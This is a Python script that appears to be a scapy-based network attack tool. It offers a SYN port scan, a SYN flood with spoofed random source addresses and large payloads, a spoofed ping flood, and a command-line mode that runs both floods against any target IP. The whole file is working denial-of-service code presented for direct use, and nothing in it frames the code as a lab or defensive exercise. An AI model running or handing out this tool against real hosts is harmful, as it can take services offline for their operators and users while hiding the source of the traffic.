#!/usr/bin/env python3
from scapy.all import *
import argparse, time
import random
import socket
import struct

def scan_port_SYN(ip=str, sport=int, eport=int, debug:bool=False):
    source_port = random.randint(32768, 60999) # ephemeral port range in Linux
    print(f"scan port for {ip} in SYN mode")
    if sport == eport:
        eport = eport + 1

    for p in range(sport, eport):
        try:
            packet = IP(dst=ip)/TCP(sport=source_port, dport=p, flags="S")
            if debug==True:
                response= sr1(packet, timeout=0.5, verbose=True)
            if debug==False:
                response= sr1(packet, timeout=0.5, verbose=False)
            if response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
                print(f"Port {p} open!")
        except KeyboardInterrupt:
            print("KeyboardInterrupt")
            exit(1)
        except:
            pass
    print("scan complete!\n")

def exploit_syn_flood(ip=str, port=int, send_packet_times:int=4, size_of_packet:int=65000, debug:bool=False):
    try:
        source_port = random.randint(32768, 60999) # ephemeral port range in Linux
        source_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        print(f"exploit {ip}:{port} with SYN flood")
        packet = IP(src=source_ip, dst=ip)/TCP(sport=source_port, dport=port, flags="S")
        raw = Raw(b"a" * size_of_packet)
        if debug==True:
            send(packet/raw, loop=1,count=send_packet_times, verbose=True)
        if debug==False:
            send(packet/raw, loop=1,count=send_packet_times, verbose=False)

        print(f"send {send_packet_times} packets to {ip}:{port} with size {size_of_packet} complete")
    except KeyboardInterrupt:
        exit(1)
    except:
        print(f"send {send_packet_times} packets to {ip}:{port} with size {size_of_packet} failed")
        exit(1)


def exploit_ping_flood(ip=str, send_packet_times:int=4, size_of_packet:int=65000, debug:bool=False):
    try:
        source_port = random.randint(32768, 60999) # ephemeral port range in Linux
        source_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        print(f"exploit {ip} with ping flood")
        packet = IP(src=source_ip, dst=ip)/ICMP()
        raw = Raw(b"a" * size_of_packet)
        if debug==True:
            send(packet/raw, count=send_packet_times, verbose=True)
        if debug==False:
            send(packet/raw, count=send_packet_times, verbose=False)
        print(f"send {send_packet_times} pings to {ip} with size {size_of_packet} complete")
    except KeyboardInterrupt:
        exit(1)
    except:
        print(f"send {send_packet_times} pings to {ip} with size {size_of_packet} failed")
        exit(1)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", dest='target', type=str, help="set IP address to scan/attack", required=True)
    parser.add_argument("-s", dest='source_port', type=int, help="set port to start scan (in scan mode)")
    parser.add_argument("-e", dest='end_port', type=int, help="set port to stop scan (in scan mode)")
    parser.add_argument("-m", dest='mode', type=str, choices=["scan", "exploit_syn_flood", "exploit_ping_flood", "exploit_all"], help="select mode to use (in attack mode)")
    parser.add_argument("-p", dest='port', type=int, help="set port to attack (in attack mode)")
    parser.add_argument("-n", dest='sent_times', type=int, help="set number of packet to sent (in attack mode)", default=4)
    parser.add_argument("-d", dest='debug', help="set debug mode", action='store_true', default=False)
    args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])

    if args.mode == "scan" and args.target and args.source_port and args.end_port:
        scan_port_SYN(args.target, args.source_port, args.end_port, args.debug)

    elif args.mode == "exploit_syn_flood" and args.target and args.port and args.sent_times:
        exploit_syn_flood(args.target, args.port, args.sent_times, debug=args.debug)

    elif args.mode == "exploit_ping_flood" and args.target and args.sent_times:
        exploit_ping_flood(args.target, args.sent_times, debug=args.debug)

    elif args.mode == "exploit_all" and args.target and args.port and args.sent_times:
        exploit_syn_flood(args.target, args.port, args.sent_times, debug=args.debug)
        exploit_ping_flood(args.target, args.sent_times, debug=args.debug)
    else:
        parser.print_help()
        parser.exit()
